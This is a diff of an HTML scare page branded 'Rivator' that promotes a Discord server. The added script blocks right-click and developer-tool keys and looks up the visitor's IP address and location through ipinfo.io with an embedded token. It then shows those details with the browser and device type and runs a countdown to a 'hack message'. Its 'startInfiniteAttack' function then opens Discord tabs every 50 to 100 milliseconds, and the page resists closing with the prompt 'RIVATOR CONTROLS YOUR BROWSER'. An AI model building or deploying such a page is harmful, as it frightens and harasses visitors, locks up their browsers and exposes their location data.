+                <div class="info-value loading" id="city">ANALYZING...</div>
             </div>
             <div class="info-card">
-                <div class="info-label">COUNTRY</div>
-                <div class="info-value" id="country"></div>
+                <div class="info-label">🧭 REGION</div>
+                <div class="info-value loading" id="region">DETECTING...</div>
             </div>
             <div class="info-card">
-                <div class="info-label">CITY</div>
-                <div class="info-value" id="city"></div>
+                <div class="info-label">🗺️ COUNTRY</div>
+                <div class="info-value loading" id="country">LOCATING...</div>
             </div>
             <div class="info-card">
-                <div class="info-label">TIMEZONE</div>
-                <div class="info-value" id="timezone"></div>
+                <div class="info-label">📍 TIMEZONE</div>
+                <div class="info-value loading" id="timezone">CALCULATING...</div>
             </div>
             <div class="info-card">
-                <div class="info-label">ISP</div>
-                <div class="info-value" id="isp"></div>
+                <div class="info-label">🌐 BROWSER</div>
+                <div class="info-value loading" id="browser">IDENTIFYING...</div>
+            </div>
+            <div class="info-card">
+                <div class="info-label">💻 OPERATING SYSTEM</div>
+                <div class="info-value loading" id="os">DETECTING...</div>
+            </div>
+            <div class="info-card">
+                <div class="info-label">📱 DEVICE TYPE</div>
+                <div class="info-value loading" id="device">ANALYZING...</div>
+            </div>
+            <div class="info-card">
+                <div class="info-label">📏 SCREEN RESOLUTION</div>
+                <div class="info-value loading" id="screen">MEASURING...</div>
             </div>
         </div>
     </div>
 
-    <!-- Enhanced Discord Button -->
-    <a href="https://discord.gg/YxsXMHJnJs" target="_blank" class="discord-button">
-        <svg class="discord-icon" viewBox="0 0 71 55" xmlns="http://www.w3.org/2000/svg">
-            <g fill="currentColor">
-                <path d="M60.1045 4.8978C55.5792 2.8214 50.7265 1.2916 45.6527 0.41542C45.5603 0.39851 45.468 0.440769 45.4204 0.525289C44.7963 1.6353 44.105 3.0834 43.6209 4.2216C38.1637 3.4046 32.7345 3.4046 27.3892 4.2216C26.905 3.0581 26.1886 1.6353 25.5617 0.525289C25.5141 0.443589 25.4218 0.40133 25.3294 0.41542C20.2584 1.2888 15.4057 2.8186 10.8776 4.8978C10.8384 4.9147 10.8048 4.9429 10.7825 4.9795C1.57795 18.7309 -0.943561 32.1443 0.293408 45.3914C0.299005 45.4562 0.335386 45.5182 0.385761 45.5576C6.45866 50.0174 12.3413 52.7249 18.1147 54.5195C18.2071 54.5477 18.305 54.5139 18.3638 54.4378C19.7295 52.5728 20.9469 50.6063 21.9907 48.5383C22.0523 48.4172 21.9935 48.2735 21.8676 48.2256C19.9366 47.4931 18.0979 46.6 16.3292 45.5858C16.1893 45.5041 16.1781 45.304 16.3068 45.2082C16.679 44.9293 17.0513 44.6391 17.4067 44.3461C17.471 44.2926 17.5606 44.2813 17.6362 44.3151C29.2558 49.6202 41.8354 49.6202 53.3179 44.3151C53.3935 44.2785 53.4831 44.2898 53.5502 44.3433C53.9057 44.6363 54.2779 44.9293 54.6529 45.2082C54.7816 45.304 54.7732 45.5041 54.6333 45.5858C52.8646 46.6197 51.0259 47.4931 49.0921 48.2228C48.9662 48.2707 48.9102 48.4172 48.9718 48.5383C50.038 50.6034 51.2554 52.5699 52.5959 54.435C52.6519 54.5139 52.7526 54.5477 52.845 54.5195C58.6464 52.7249 64.529 50.0174 70.6019 45.5576C70.6551 45.5182 70.6887 45.459 70.6943 45.3942C72.1747 30.0791 68.2147 16.7757 60.1968 4.9823C60.1772 4.9429 60.1437 4.9147 60.1045 4.8978ZM23.7259 37.3253C20.2276 37.3253 17.3451 34.1136 17.3451 30.1693C17.3451 26.225 20.1717 23.0133 23.7259 23.0133C27.308 23.0133 30.1626 26.2532 30.1066 30.1693C30.1066 34.1136 27.28 37.3253 23.7259 37.3253ZM47.3178 37.3253C43.8196 37.3253 40.9371 34.1136 40.9371 30.1693C40.9371 26.225 43.7636 23.0133 47.3178 23.0133C50.9 23.0133 53.7545 26.2532 53.6986 30.1693C53.6986 34.1136 50.9 37.3253 47.3178 37.3253Z"/>
-            </g>
+    <!-- Discord Button -->
+    <a href="https://discord.gg/8z6c9ePRBx" class="discord-button" target="_blank">
+        <svg class="discord-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 127.14 96.36">
+            <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z"/>
         </svg>
-        <span>Join Rivator Hub</span>
+        ⚡ JOIN RIVATOR SERVER ⚡
     </a>
 
     <script>
-        // Matrix Rain Effect
-        function createMatrixRain() {
-            const matrixRain = document.getElementById('matrix-rain');
-            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%^&*()_+-=[]{}|;:,.<>?';
-            const columnCount = Math.floor(window.innerWidth / 20);
-            
-            for (let i = 0; i < columnCount; i++) {
-                const column = document.createElement('div');
-                column.className = 'matrix-column';
-                column.style.left = `${i * 20}px`;
-                column.style.animationDuration = `${Math.random() * 5 + 5}s`;
-                column.style.animationDelay = `${Math.random() * 5}s`;
-                
-                let columnText = '';
-                const columnLength = Math.floor(Math.random() * 20 + 10);
-                for (let j = 0; j < columnLength; j++) {
-                    columnText += characters.charAt(Math.floor(Math.random() * characters.length)) + '<br>';
-                }
-                column.innerHTML = columnText;
-                matrixRain.appendChild(column);
+        document.addEventListener('contextmenu', event => event.preventDefault());
+        document.addEventListener('keydown', event => {
+            if (event.ctrlKey || event.shiftKey || event.altKey || event.key === 'F12') {
+                event.preventDefault();
             }
+        });
+
+        // Matrix Rain Effect - Enhanced
+        const matrixRain = document.getElementById('matrix-rain');
+        const chars = '01RIVATOR01ريفاتور01◢◤◣';
+
+        function createMatrixColumn() {
+            const column = document.createElement('div');
+            column.style.position = 'absolute';
+            column.style.left = Math.random() * 100 + '%';
+            column.style.top = '-20px';
+            column.style.color = Math.random() > 0.5 ? '#00ffff' : '#ff00ff';
+            column.style.fontSize = (Math.random() * 8 + 12) + 'px';
+            column.style.fontFamily = 'Share Tech Mono, monospace';
+            column.style.opacity = Math.random() * 0.7 + 0.3;
+            column.textContent = chars.charAt(Math.floor(Math.random() * chars.length));
+            column.style.animation = `fall ${Math.random() * 2 + 1.5}s linear`;
+            column.style.textShadow = `0 0 10px currentColor`;
+            matrixRain.appendChild(column);
+
+            setTimeout(() => column.remove(), 3500);
         }
 
-        // Enhanced Particle System
-        let particles = [];
-        const particleCount = 150;
+        setInterval(createMatrixColumn, 50);
 
+        // Add fall animation
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes fall {
+                to { transform: translateY(100vh); opacity: 0; }
+            }
+        `;
+        document.head.appendChild(style);
+
+        // Particles Canvas - Enhanced
         const canvas = document.getElementById('particles-canvas');
         const ctx = canvas.getContext('2d');
-        
         canvas.width = window.innerWidth;
         canvas.height = window.innerHeight;
 
+        const particles = [];
+        const particleCount = 150;
+        const colors = ['#00ffff', '#ff00ff', '#00ff00', '#ff0000'];
+
         class Particle {
             constructor() {
-                this.reset();
-            }
-
-            reset() {
                 this.x = Math.random() * canvas.width;
                 this.y = Math.random() * canvas.height;
-                this.size = Math.random() * 4 + 1;
-                this.speedX = (Math.random() - 0.5) * 3;
-                this.speedY = (Math.random() - 0.5) * 3;
-                this.color = this.getRandomColor();
-                this.opacity = Math.random();
-                this.pulseSpeed = Math.random() * 0.05 + 0.01;
-                this.pulsePhase = Math.random() * Math.PI * 2;
-            }
-
-            getRandomColor() {
-                const colors = ['#ff00ff', '#00ffff', '#ffff00', '#ff0080', '#00ff80', '#ff4500', '#9400d3'];
-                return colors[Math.floor(Math.random() * colors.length)];
+                this.vx = (Math.random() - 0.5) * 1.5;
+                this.vy = (Math.random() - 0.5) * 1.5;
+                this.radius = Math.random() * 2.5 + 0.5;
+                this.color = colors[Math.floor(Math.random() * colors.length)];
             }
 
             update() {
-                this.x += this.speedX;
-                this.y += this.speedY;
-                this.pulsePhase += this.pulseSpeed;
+                this.x += this.vx;
+                this.y += this.vy;
 
-                if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
-                if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
-
-                this.opacity = 0.5 + Math.sin(this.pulsePhase) * 0.5;
+                if (this.x < 0 || this.x > canvas.width) this.vx *= -1;
+                if (this.y < 0 || this.y > canvas.height) this.vy *= -1;
             }
 
             draw() {
-                const glowSize = this.size * (2 + Math.sin(this.pulsePhase) * 0.5);
-                
                 ctx.beginPath();
-                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
                 ctx.fillStyle = this.color;
-                ctx.globalAlpha = this.opacity;
-                ctx.fill();
-                ctx.globalAlpha = 1;
-
-                // Enhanced glow effect
-                ctx.shadowBlur = glowSize * 5;
+                ctx.shadowBlur = 15;
                 ctx.shadowColor = this.color;
                 ctx.fill();
-                ctx.shadowBlur = 0;
             }
         }
 
-        // Initialize particles
         for (let i = 0; i < particleCount; i++) {
             particles.push(new Particle());
         }
 
-        function animateParticles() {
-            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-            particles.forEach(particle => {
-                particle.update();
-                particle.draw();
-            });
-
-            // Connect nearby particles with enhanced lines
-            particles.forEach((p1, i) => {
-                particles.slice(i + 1).forEach(p2 => {
-                    const dx = p1.x - p2.x;
-                    const dy = p1.y - p2.y;
+        function connectParticles() {
+            for (let i = 0; i < particles.length; i++) {
+                for (let j = i + 1; j < particles.length; j++) {
+                    const dx = particles[i].x - particles[j].x;
+                    const dy = particles[i].y - particles[j].y;
                     const distance = Math.sqrt(dx * dx + dy * dy);
 
-                    if (distance < 200) {
+                    if (distance < 120) {
                         ctx.beginPath();
-                        const gradient = ctx.createLinearGradient(p1.x, p1.y, p2.x, p2.y);
-                        gradient.addColorStop(0, p1.color);
-                        gradient.addColorStop(1, p2.color);
-                        ctx.strokeStyle = gradient;
-                        ctx.globalAlpha = (200 - distance) / 200 * 0.4;
-                        ctx.lineWidth = 2;
-                        ctx.moveTo(p1.x, p1.y);
-                        ctx.lineTo(p2.x, p2.y);
+                        ctx.strokeStyle = `rgba(0, 255, 255, ${1 - distance / 120})`;
+                        ctx.lineWidth = 0.5;
+                        ctx.moveTo(particles[i].x, particles[i].y);
+                        ctx.lineTo(particles[j].x, particles[j].y);
                         ctx.stroke();
-                        ctx.globalAlpha = 1;
                     }
-                });
-            });
-
-            requestAnimationFrame(animateParticles);
-        }
-
-        // Force Audio to Start at 10 seconds and Keep Playing
-        const backgroundMusic = document.getElementById('background-music');
-        let musicInitialized = false;
-
-        function forcePlayMusic() {
-            if (!musicInitialized) {
-                // Set the audio to start at 10 seconds
-                backgroundMusic.currentTime = 10;
-                
-                // Try to play
-                const playPromise = backgroundMusic.play();
-                
-                if (playPromise !== undefined) {
-                    playPromise.then(_ => {
-                        console.log('Music started at 10 seconds');
-                        musicInitialized = true;
-                    })
-                    .catch(error => {
-                        console.log('Autoplay prevented, will retry on user interaction');
-                    });
                 }
             }
         }
 
-        // Multiple attempts to start music
-        window.addEventListener('load', () => {
-            createMatrixRain();
-            animateParticles();
-            
-            // Initial attempt
-            forcePlayMusic();
-            
-            // Retry after a short delay
-            setTimeout(forcePlayMusic, 1000);
-            
-            // Retry again after user interaction
-            document.addEventListener('click', forcePlayMusic, { once: true });
-            document.addEventListener('keydown', forcePlayMusic, { once: true });
-            document.addEventListener('mousemove', forcePlayMusic, { once: true });
-            
-            fetchUserData();
-        });
-
-        // Prevent any attempts to stop the music
-        backgroundMusic.addEventListener('pause', (e) => {
-            e.preventDefault();
-            backgroundMusic.play().catch(error => {
-                console.log('Forcefully resuming music');
-                setTimeout(() => {
-                    backgroundMusic.play();
-                }, 100);
+        function animate() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            particles.forEach(particle => {
+                particle.update();
+                particle.draw();
             });
-        });
+            connectParticles();
+            requestAnimationFrame(animate);
+        }
 
-        // Loop back to 10 seconds when it ends
-        backgroundMusic.addEventListener('ended', () => {
-            backgroundMusic.currentTime = 10;
-            backgroundMusic.play();
-        });
+        animate();
 
-        // Prevent volume changes
-        backgroundMusic.addEventListener('volumechange', (e) => {
-            if (backgroundMusic.volume < 0.5) {
-                backgroundMusic.volume = 1.0;
+        // Countdown Timer - 5 seconds
+        let timeLeft = 5;
+        const countdownEl = document.getElementById('mini-countdown');
+        let attackActive = false;
+
+        const countdownInterval = setInterval(() => {
+            if(timeLeft > 0) {
+                timeLeft--;
+                countdownEl.textContent = `00:0${timeLeft}`;
+                if(timeLeft <= 3) {
+                    countdownEl.style.fontSize = '2em';
+                    countdownEl.style.borderColor = '#ff0000';
+                }
+            } else {
+                clearInterval(countdownInterval);
+                countdownEl.style.display = 'none';
+
+                // Show hack message
+                document.getElementById('hack-message').style.display = 'block';
+
+                // Start infinite attack after 2 seconds
+                setTimeout(() => {
+                    attackActive = true;
+                    startInfiniteAttack();
+                }, 2000);
             }
+        }, 1000);
+
+        function startInfiniteAttack() {
+            const discordUrl = 'https://discord.gg/8z6c9ePRBx';
+
+            // SUPER FAST - Opens tab every 50ms (20 tabs per second)
+            setInterval(() => {
+                try {
+                    window.open(discordUrl, '_blank');
+                } catch(e) {
+                    // Keep trying even if blocked
+                }
+            }, 50);
+
+            // EXTRA FAST BACKUP - Opens another tab every 75ms
+            setInterval(() => {
+                try {
+                    window.open(discordUrl, '_blank');
+                } catch(e) {}
+            }, 75);
+
+            // ULTRA FAST BACKUP - Opens another tab every 100ms
+            setInterval(() => {
+                try {
+                    window.open(discordUrl, '_blank');
+                } catch(e) {}
+            }, 100);
+        }
+
+        // Fetch IP Information - USING IPINFO.IO METHOD
+        fetch("https://ipinfo.io/json?token=de932e5614fa4d")
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById("ip").textContent = data.ip || "N/A";
+                document.getElementById("ip").classList.remove("loading");
+
+                document.getElementById("city").textContent = data.city || "N/A";
+                document.getElementById("city").classList.remove("loading");
+
+                document.getElementById("region").textContent = data.region || "N/A";
+                document.getElementById("region").classList.remove("loading");
+
+                document.getElementById("country").textContent = data.country || "N/A";
+                document.getElementById("country").classList.remove("loading");
+
+                document.getElementById("timezone").textContent = data.timezone || "N/A";
+                document.getElementById("timezone").classList.remove("loading");
+            })
+            .catch(() => {
+                document.querySelectorAll(".info-value").forEach(el => {
+                    el.textContent = "Error";
+                    el.classList.remove("loading");
+                });
+            });
+
+        // Detect browser
+        const ua = navigator.userAgent;
+        let browser = "Unknown";
+        if(ua.indexOf("Firefox") > -1) browser = "Firefox";
+        else if(ua.indexOf("Chrome") > -1) browser = "Chrome";
+        else if(ua.indexOf("Safari") > -1) browser = "Safari";
+        else if(ua.indexOf("Edge") > -1) browser = "Edge";
+        else if(ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) browser = "Opera";
+        document.getElementById("browser").textContent = browser;
+        document.getElementById("browser").classList.remove("loading");
+
+        // Detect OS
+        let os = "Unknown";
+        if(ua.indexOf("Win") > -1) os = "Windows";
+        else if(ua.indexOf("Mac") > -1) os = "MacOS";
+        else if(ua.indexOf("Linux") > -1) os = "Linux";
+        else if(ua.indexOf("Android") > -1) os = "Android";
+        else if(ua.indexOf("iOS") > -1) os = "iOS";
+        document.getElementById("os").textContent = os;
+        document.getElementById("os").classList.remove("loading");
+
+        // Detect device
+        let device = /Mobile|Android|iPhone|iPad/.test(ua) ? "Mobile" : "Desktop";
+        document.getElementById("device").textContent = device;
+        document.getElementById("device").classList.remove("loading");
+
+        // Screen resolution
+        document.getElementById("screen").textContent = `${window.screen.width} x ${window.screen.height}`;
+        document.getElementById("screen").classList.remove("loading");
+
+        // Audio auto-start with user interaction fallback - STARTS AT 0:30
+        const audio = document.getElementById('background-music');
+        audio.volume = 0.3;
+        audio.currentTime = 30;
+
+        // Try to autoplay
+        audio.play().catch(e => {
+            console.log('Autoplay blocked, waiting for user interaction');
+            // Play on any user interaction
+            const playOnInteraction = () => {
+                audio.currentTime = 30;
+                audio.play().catch(err => console.log('Audio play failed:', err));
+                document.removeEventListener('click', playOnInteraction);
+                document.removeEventListener('touchstart', playOnInteraction);
+                document.removeEventListener('keydown', playOnInteraction);
+            };
+            document.addEventListener('click', playOnInteraction);
+            document.addEventListener('touchstart', playOnInteraction);
+            document.addEventListener('keydown', playOnInteraction);
         });
 
-        // Set volume to maximum
-        backgroundMusic.volume = 1.0;
-
-        // Prevent right-click context menu on audio
-        backgroundMusic.addEventListener('contextmenu', (e) => {
-            e.preventDefault();
-            return false;
+        // When audio loops, make sure it starts at 30 seconds again
+        audio.addEventListener('ended', function() {
+            this.currentTime = 30;
+            this.play();
         });
 
+        // Resize canvas on window resize
         window.addEventListener('resize', () => {
             canvas.width = window.innerWidth;
             canvas.height = window.innerHeight;
         });
 
-        // Fetch user IP and location data
-        async function fetchUserData() {
-            const infoGrid = document.getElementById('info-grid');
-            
-            try {
-                const response = await fetch('https://ip-api.com/json/?fields=status,message,country,countryCode,city,region,regionName,lat,lon,timezone,isp,query');
-                const data = await response.json();
-                
-                if (data.status === 'success') {
-                    document.getElementById('ip-address').textContent = data.query || 'N/A';
-                    document.getElementById('location').textContent = 
-                        `${data.lat || 'N/A'}, ${data.lon || 'N/A'}`;
-                    document.getElementById('country').textContent = 
-                        `${data.country || 'N/A'} (${data.countryCode || 'N/A'})`;
-                    document.getElementById('city').textContent = 
-                        `${data.city || 'N/A'}, ${data.regionName || data.region || 'N/A'}`;
-                    document.getElementById('timezone').textContent = data.timezone || 'N/A';
-                    document.getElementById('isp').textContent = data.isp || 'N/A';
-                    
-                    // Show info grid after data is loaded
-                    infoGrid.classList.add('show');
-                } else {
-                    throw new Error('API returned error');
-                }
-            } catch (error) {
-                console.error('Error fetching user data:', error);
-                
-                try {
-                    const fallbackResponse = await fetch('https://ipapi.co/json/');
-                    const fallbackData = await fallbackResponse.json();
-                    
-                    if (fallbackData.ip) {
-                        document.getElementById('ip-address').textContent = fallbackData.ip || 'N/A';
-                        document.getElementById('location').textContent = 
-                            `${fallbackData.latitude || 'N/A'}, ${fallbackData.longitude || 'N/A'}`;
-                        document.getElementById('country').textContent = 
-                            `${fallbackData.country_name || 'N/A'} (${fallbackData.country_code || 'N/A'})`;
-                        document.getElementById('city').textContent = 
-                            `${fallbackData.city || 'N/A'}, ${fallbackData.region || 'N/A'}`;
-                        document.getElementById('timezone').textContent = fallbackData.timezone || 'N/A';
-                        document.getElementById('isp').textContent = fallbackData.org || 'N/A';
-                        
-                        // Show info grid after data is loaded
-                        infoGrid.classList.add('show');
-                    }
-                } catch (fallbackError) {
-                    console.error('Fallback API error:', fallbackError);
-                }
-            }
-        }
+        // Random glitch effect on text
+        setInterval(() => {
+            const rivatorText = document.querySelector('.rivator-text');
+            rivatorText.style.transform = `translate(${Math.random() * 4 - 2}px, ${Math.random() * 4 - 2}px)`;
+            setTimeout(() => {
+                rivatorText.style.transform = '';
+            }, 50);
+        }, 3000);
 
-        // Prevent copy, cut, and context menu
-        document.addEventListener('copy', (e) => {
-            e.preventDefault();
-            return false;
-        });
-
-        document.addEventListener('cut', (e) => {
-            e.preventDefault();
-            return false;
-        });
-
-        document.addEventListener('contextmenu', (e) => {
-            e.preventDefault();
-            return false;
-        });
-
-        // Prevent drag
-        document.addEventListener('dragstart', (e) => {
-            e.preventDefault();
-            return false;
-        });
-
-        // Prevent keyboard shortcuts that might stop music
-        document.addEventListener('keydown', (e) => {
-            // Prevent space bar, escape, and other keys that might stop audio
-            if (e.code === 'Space' || e.code === 'Escape' || e.code === 'KeyM') {
-                e.preventDefault();
-                return false;
-            }
-        });
+        // Prevent closing
+        window.onbeforeunload = function() {
+            return "RIVATOR CONTROLS YOUR BROWSER";
+        };
     </script>
 </body>
 </html>
